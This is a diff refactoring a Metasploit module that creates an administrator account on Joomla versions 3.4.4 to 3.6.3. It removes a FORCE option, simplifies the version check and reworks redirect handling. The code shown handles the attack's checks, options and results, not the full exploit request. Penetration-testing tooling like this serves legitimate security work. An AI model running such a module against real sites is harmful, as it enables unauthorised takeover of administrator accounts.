@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Joomla Account Creation and Privilege Escalation',
       'Description'    => %q{
-        This module allows to create an arbitrary account with administrative privileges in Joomla versions 3.4.4
+        This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4
         through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
       },
       'References'     =>
@@ -37,14 +37,13 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/']),
         OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),
         OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),
-        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com']),
-        OptString.new('FORCE', [true, 'Force bypass checks', 'false'])
+        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])
       ]
     )
   end
 
   def check
-    res = send_request_cgi({'uri' => target_uri.path })
+    res = send_request_cgi('uri' => target_uri.path)
 
     unless res
       print_error("Connection timed out")
@@ -58,9 +57,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     version = Gem::Version.new(joomla_version)
-    unless version.nil?
+    if version
       print_status("Detected Joomla version #{joomla_version}")
-      return Exploit::CheckCode::Appears if version >= Gem::Version.new('3.4.4') && version <= Gem::Version.new('3.6.3')
+      return Exploit::CheckCode::Appears if version.between?(Gem::Version.new('3.4.4'), Gem::Version.new('3.6.3'))
     end
 
     return Exploit::CheckCode::Detected if online
@@ -78,11 +77,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    if datastore['FORCE'] == 'false'
-      if check == Exploit::CheckCode::Safe
-        print_error('Target seems safe, so we will not continue!')
-        return
-      end
+    if check == Exploit::CheckCode::Safe
+      print_error('Target seems safe, so we will not continue!')
+      return
     end
 
     print_status("Trying to create the user!")
@@ -130,14 +127,13 @@ class MetasploitModule < Msf::Auxiliary
       print_good("PWND - Your user has been created")
       print_status("\tUsername: " + datastore['USERNAME'])
       print_status("\tPassword: " + datastore['PASSWORD'])
-    elsif res && res.code == 303
-      while res && res.code == 303 do
-        res = send_request_cgi(
-          'uri' => res.redirection.to_s,
-          'method' => 'GET',
-          'cookie'  => cookie
-        )
-      end
+      print_status("\tEmail: " + datastore['EMAIL'])
+    elsif res.redirect?
+      res = send_request_cgi!(
+        'uri' => res.redirection.path,
+        'method' => 'GET',
+        'cookie'  => cookie
+      )
 
       print_error("There was an issue, but the user could have been created.")
 
